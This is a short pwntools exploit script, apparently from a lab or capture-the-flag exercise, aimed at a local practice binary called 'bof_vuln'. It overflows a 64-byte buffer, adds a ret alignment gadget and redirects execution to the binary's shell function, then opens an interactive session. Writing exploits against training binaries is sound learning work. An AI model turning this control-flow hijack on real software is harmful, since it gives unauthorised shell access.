#!/usr/bin/env python3
from pwn import *

exe = ELF('../binary/bof_vuln')
rop = ROP(exe)

g = rop.find_gadget(['ret'])

if isinstance(g, int):
    ret_gadget = g
elif hasattr(g, 'address'):
    ret_gadget = g.address
elif isinstance(g, list):
    first = g[0]
    if isinstance(first, int):
        ret_gadget = first
    elif hasattr(first, 'address'):
        ret_gadget = first.address
    else:
        raise ValueError(f"Không hiểu format gadget list: {g!r}")
else:
    raise ValueError(f"Không hiểu format gadget: {g!r}")

offset     = 64 + 8
shell_addr = exe.symbols['shell']

log.info(f"Offset       = {offset}")
log.info(f"ret gadget   = {hex(ret_gadget)}")
log.info(f"shell() addr = {hex(shell_addr)}")

payload = flat(
    b"A" * offset,
    p64(ret_gadget),
    p64(shell_addr)
)

p = process(exe.path)

p.sendline(payload)
p.interactive()
